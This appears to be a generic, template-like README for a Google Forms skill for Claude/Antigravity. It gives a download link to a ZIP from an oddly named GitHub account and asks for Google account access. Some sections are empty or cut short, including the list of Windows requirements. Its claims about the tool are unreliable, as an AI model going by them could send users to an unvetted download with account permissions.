# 📝 google-forms-skill - Create Google Forms from Any Content

[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/capitalisationhumulin242/google-forms-skill)

## 🚀 Getting Started

google-forms-skill helps you turn plain text, notes, outlines, and other content into Google Forms. It works as an Antigravity/Claude skill and uses the Google Forms API to build forms from your input.

Use it when you want to make a form without building each question by hand. It fits simple surveys, quizzes, intake forms, feedback forms, and sign-up forms.

Before you start, make sure your Windows PC has:

## 📦 What This Tool Does

This project is built to:

- Create Google Forms from written content
- Turn lists into questions
- Build multiple-choice, short answer, and checkbox fields
- Keep your form structure clear
- Save time when you need many forms

It is useful if you already have your questions in a document, message, or outline and want to move them into Google Forms fast.

## ⚙️ Setup

Use the skill inside the app you already use with Antigravity or Claude.

Typical setup steps:

1. Open your app or workspace.
2. Add the downloaded google-forms-skill files to the skill folder or import area used by your app.
3. Make sure the app can read the files.
4. Sign in with the Google account you want to use.
5. Allow access to Google Forms when the app asks for it.
6. Check that the skill is listed as available before you try to create a form.

If your app uses a local skills folder, place the project in that folder. If it uses an import tool, use that tool to add the downloaded files.

## 🧭 How to Use

Once the skill is set up, give it content you want turned into a form.

- A meeting feedback list

You can ask it to:

- Create a new Google Form
- Add questions in order
- Choose the right question type
- Set required fields
- Build a quiz with answers
- Organize sections for long forms

Sample request:

- Create a Google Form from these questions and make the first two required.
- Turn this outline into a survey with multiple choice and short answer fields.
- Build a quiz from this content and mark the correct answers.

## 🔒 Google Account Access

This tool needs access to Google Forms through your Google account. Use the same account you want the form to belong to.

If you manage work forms, use your work account. If you manage personal forms, use your personal account. This keeps ownership in the right place and makes it easier to find the form later.

## 🧩 Tips for Best Results

- Write your questions in plain text
- Put one question on each line when you can
- Use clear labels for answer choices
- Group related questions together
- Say which fields should be required
- Mention if the form should be a quiz or survey

Good input leads to a cleaner form. Short, direct content works best.

## 🧰 Troubleshooting

### The download does not start
Refresh the GitHub page and try again. Check your internet connection and try a different browser.

### The ZIP file will not open
Use the built-in Windows extract tool or another unzip tool installed on your PC.

### The skill does not appear in the app
Check that you placed the files in the right folder and that the app can access them.

### Google access fails
Sign out of Google and sign in again. Then try the permission step once more.

### The form looks wrong
Review the text you gave the skill. Clearer input usually gives better results.
